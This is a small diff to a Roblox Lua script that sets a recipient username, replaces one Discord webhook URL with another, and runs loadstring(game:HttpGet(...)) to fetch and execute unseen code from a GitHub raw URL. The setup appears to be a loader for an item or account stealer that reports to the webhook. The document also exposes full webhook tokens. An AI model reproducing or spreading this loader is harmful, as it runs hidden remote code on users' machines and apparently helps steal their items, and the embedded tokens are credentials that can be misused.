@@ -1,5 +1,5 @@
 getgenv().gui = false
 Username = "tadash_10"
-Webhook = "https://discord.com/api/webhooks/1284860831447777330/afcQcYS_2mDMpOmqIefNXKVBy0AYcaRp4DqA1r1sPkhLrrc89O3GxoRA4nhrZxcTAkJ7"
+Webhook = "https://discord.com/api/webhooks/1284860834886975541/Scw_BgOMhZhYlUnPOh_BTxbvHLlkAOtmcWMyHDgrIaQoDXYmx1Uv8TawW_aoNIe_moFm"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/doslobodydoedy/x/main/main.lua"))()
